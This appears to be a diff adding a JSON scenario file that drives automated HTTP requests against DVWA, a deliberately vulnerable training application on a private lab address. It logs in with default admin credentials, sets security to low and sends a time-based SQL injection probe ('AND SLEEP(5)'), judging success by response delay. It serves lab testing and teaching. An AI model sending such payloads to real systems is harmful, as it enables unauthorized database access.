@@ -1,0 +1,84 @@
+{
+  "name": "DVWA SQLi Demo - Autonomous Switch to Time-Based + Verified Stop",
+  "base_url": "http://192.168.64.7/dvwa",
+  "timeout": 20,
+  "success": {
+    "require_security_level": "low",
+    "time_diff": {
+      "baseline_step": "sqli_baseline",
+      "probe_step": "sqli_probe",
+      "min_delta_s": 3.0
+    }
+  },
+  "steps": [
+    {
+      "id": "get_login",
+      "name": "GET login page (fetch user_token if present)",
+      "method": "GET",
+      "path": "/login.php",
+      "headers": {}
+    },
+    {
+      "id": "login",
+      "name": "POST login (admin/password + user_token if required)",
+      "method": "POST",
+      "path": "/login.php",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "username=admin&password=password&Login=Login&user_token={{user_token}}"
+    },
+    {
+      "id": "home_check",
+      "name": "GET home (check Logout exists)",
+      "method": "GET",
+      "path": "/",
+      "headers": {}
+    },
+    {
+      "id": "get_security",
+      "name": "GET security page (fetch user_token if required)",
+      "method": "GET",
+      "path": "/security.php",
+      "headers": {}
+    },
+    {
+      "id": "set_security_low",
+      "name": "POST set security level low",
+      "method": "POST",
+      "path": "/security.php",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "security=low&seclev_submit=Submit&user_token={{user_token}}"
+    },
+    {
+      "id": "security_check",
+      "name": "GET security page again (confirm low)",
+      "method": "GET",
+      "path": "/security.php",
+      "headers": {}
+    },
+    {
+      "id": "sqli_page",
+      "name": "GET SQLi page",
+      "method": "GET",
+      "path": "/vulnerabilities/sqli/",
+      "headers": {}
+    },
+    {
+      "id": "sqli_baseline",
+      "name": "Baseline request (fast)",
+      "method": "GET",
+      "path": "/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "headers": {}
+    },
+    {
+      "id": "sqli_probe",
+      "name": "Time-based probe (slow)",
+      "method": "GET",
+      "path": "/vulnerabilities/sqli/?id=1%27+AND+SLEEP%285%29+--+-&Submit=Submit",
+      "headers": {}
+    }
+  ]
+}
